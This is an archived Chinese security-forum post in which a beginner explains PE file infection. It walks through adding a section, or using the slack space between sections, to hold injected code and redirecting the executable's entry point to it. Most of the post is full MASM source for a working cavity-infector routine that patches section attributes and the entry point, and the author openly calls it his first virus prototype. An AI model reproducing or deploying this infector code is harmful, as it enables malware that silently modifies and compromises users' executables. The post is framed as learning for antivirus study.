
# 菜鸟的第一个病毒雏形

> 原文：[`www.pediy.com/kssd/pediy10/92374.html`](https://www.pediy.com/kssd/pediy10/92374.html)

这是本人第一次在看雪发贴，看着一个个高手精彩的贴子，小弟的发这粗浅的文章，心里总是有点惴惴不安的。

最近一直在看 `xfish` 的【Anti Virus 专题】系列文章，略有心得，上来向大家汇报一下。

首先把罗云彬的《Windows 环境下 32 位汇编语言程序设计》第十七章的 `AddCode` 的代码翻出来了。这个程序是往一个 PE 文件中附加一节(section)，在节中加入附加代码，并把入口地址改成新加的代码的第一条指令的地址，当附加代码运行完后再跳转到原来的代码运行。

之前看第一遍的时候基本就是囫囵吞枣的看完的，有很多地方不求甚解，这次决心把它彻底搞清楚。一共是四个文件：

* `Main.asm` 界面主程序
* `_ProcessPeFile.asm` 处理文件的程序
* `_AddCode.asm` 要附加的代码
* `_GetKernel.asm` 由于附加代码没有导入表，所以一切 API 函数都要自己获取。

看 `Main.asm` 还比较容易，无非就了 WINDOWS 对话框程序，消息处理函数中处理点击菜单项，调用 `windowsAPI` 显示打开文件对话框。

接下来就是处理选择的文件了，程序在 `_ProcessPeFile.asm` 中。一开始先复制一个 PE 文件的复本，在这个复本上进行修改。再往下看，就费劲了。虽然有些注释，但还是费劲，一条注释下面 N 条语句。知道是注释的这个功能，可是还是不容易看懂。想个办法，把《加密与解密》翻开看着 PE 文件的结构和字段意义，把每一条语句都注释出来。终于看明白了。

要一个 PE 文件里加入一节的信息，并把代码写进去，需要修改以下几个地方：

1. `IMAGE_NT_HEADERS.FileHeader.NumberOfSections += 1;` 这里记录了文件中 `SECTION` 的数量
2. `IMAGE_NT_HEADERS.OptionalHeader.SizeOfCode += 附加代码长度`
3. `IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage += 附加代码长度`
4. 然后在原文件最后一个节表的后面增加一个节表，新节表的各个字段需做如下设置
   * `SizeOfRawData = 依 IMAGE_NT_HEADERS.OptionalHeader.FileAlignment 对齐后的 附加代码长度`
   * `VirtualAddress = 依 IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment 对齐后的的 附加代码段长度`
   * `Misc.VirtualSize = 附加代码段的长度`
   * `Characteristics = IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE`
   * `PointerToRawData = 原最后一节的 PointerToRawData + 原最后一节的 SizeOfRawData`
5. `IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint = 新节的 VirtualAddress + 附加代码中第一条指令的偏移量`
6. 修改附加代码最后的跳转地址为原入口地址

这样加入一节可能会有问题，如果最后一个节表到数据区的的间隔不足以再放下一个节表（40 个字节）的话，这种方法会破坏第一节的数据区。索性的是绝大多数的 EXE 文件这里的空隙都大于 40 个字节。这样的做法还有一个特点就是会改变文件大小。

搞清楚了这个程序的原理，我就想，其实两个相临的节数据之间还是有空隙的，何不用这个空隙来写入附加代码呢？这样 1)~4)数据都不用修改，只要再改变一下插入数据那一节的节中 `Misc.VirtualSize` 字段即可（其实不改它也是可以的，对于反复感染会带来一些麻烦），具体代码如下（MASM 版本）

代码:

```
        _ProcessPeFile    proc 
      local    @szNewFile[ MAX_PATH]:byte
      local    @hFile,@dwTemp,@dwEntry,@lpMemory
      LOCAL   @oldEntryPoint, @FileSize
      pushad

      invoke    lstrcpy,addr @szNewFile,addr szFileName
      invoke    lstrlen,addr @szNewFile
      lea    ecx,@szNewFile
      mov    byte ptr [ecx+eax-4],0
      invoke    lstrcat,addr @szNewFile,addr szExt                 ;构造新文件名
      invoke    CopyFile,addr szFileName,addr @szNewFile,FALSE    ;复制一个副本

      ;打开文件
      invoke    CreateFile,addr @szNewFile,GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ or \
          FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL
      .if    eax ==    INVALID_HANDLE_VALUE
          jmp    _Ret
      .endif
      mov    @hFile,eax
      invoke GetFileSize,@hFile, NULL                         ;获取文件大小
      mov @FileSize, eax
      invoke    GlobalAlloc,GMEM_ZEROINIT,@FileSize            ;申请与文件一样大的内存
      mov @lpMemory, eax
      invoke ReadFile,@hFile, @lpMemory, @FileSize, addr @dwTemp, NULL ;将文件读入内存
      mov esi, @lpMemory
      assume esi:ptr IMAGE_DOS_HEADER
      add esi, [[esi].e_lfanew]
      assume esi:ptr IMAGE_NT_HEADERS                 ;esi 指向 IMAGE_NT_HEADERS
      movsx ecx, [esi].FileHeader.NumberOfSections    ;获取 SECTION 数目,下面遍历所有节表用
      push [esi].OptionalHeader.AddressOfEntryPoint
      pop @oldEntryPoint                                 ;保存旧的入口 RVA
      mov edx, esi
      add edx, sizeof IMAGE_NT_HEADERS
      assume edx:ptr IMAGE_SECTION_HEADER                ;edx 指向 IMAGE_SECTION_HEADER
  ScanSection:                                           ;循环判断 SizeOfRawData-VirtualSize
                                                       ;是不是大于附加代码长度
      mov eax, [edx].SizeOfRawData
      sub eax, [edx].Misc.VirtualSize
      cmp eax, offset APPEND_CODE_END - offset APPEND_CODE
      jg MoveData
      add edx, sizeof IMAGE_SECTION_HEADER
      loop  ScanSection
      jmp Free                                             ;没有符合条件的节,释放内存,关闭文件
  MoveData:
      mov ebx, [edx].PointerToRawData
      add ebx, [edx].Misc.VirtualSize ;这里是相对地址
      add ebx, @lpMemory                                               
      push esi         ;保护 esi
      lea esi, offset APPEND_CODE                         ;准备 esi 寄存器, SRC
      mov    edi, ebx                                       ;准备 edi, DST
      mov ecx, offset APPEND_CODE_END - offset APPEND_CODE    ;准备 ecx, 存入附加代码长度
      cld
      rep movsb    ;copy 附加代码到文件内存中
      pop esi        ;恢复 esi 的值
       sub edi, 5    ;末尾代码是 push XXXXXXXX
               ;    RET
               ;所以要把 XXXXXXXX 修改成你想要的地址
               ;就要向前移动 5 个字节         
      mov eax, @oldEntryPoint    ;eax 得到原入口地址的 RVA
      add eax, [esi].OptionalHeader.ImageBase    ;eax 加上 exe 文件载入基址
      mov dword ptr[edi], eax                                ;修改附加代码后的跳转地址
      or [edx].Characteristics, 0E0000020h                ;修改该节属性为可以运行
      mov eax, [edx].VirtualAddress                         ;得到原来该节的起始 RVA
      add eax, [edx].Misc.VirtualSize                        ;加上内存映射大小
      add eax, offset _NewEntry - offset APPEND_CODE        ;在跳过附加代码开头的数据区
      mov [esi].OptionalHeader.AddressOfEntryPoint, eax    ;修改入口地址

      ;下面一句是可选的,如果不改变的话，二次感染会发生问题,附加代码出现死循环,有兴趣的朋友可以试试
      add [edx].Misc.VirtualSize, offset APPEND_CODE_END - offset APPEND_CODE

      ;移动文件指针到文件开头
      invoke SetFilePointer,@hFile, 0, NULL, FILE_BEGIN
      ;写数据到文件
      invoke WriteFile, @hFile, @lpMemory, @FileSize,addr @dwTemp, NULL


  Free:
      invoke    GlobalFree,@lpMemory                ;释放内存
      invoke    CloseHandle,@hFile                    ;关闭文件
      _Ret:
      assume    esi:nothing
      popad
      ret

  _ProcessPeFile    endp
```

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || MyFisrtVirus.rar
|
| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || (Windows 环境下 32 位汇编语言程序设计)AddCode.rar [解压密码：pediy]
|
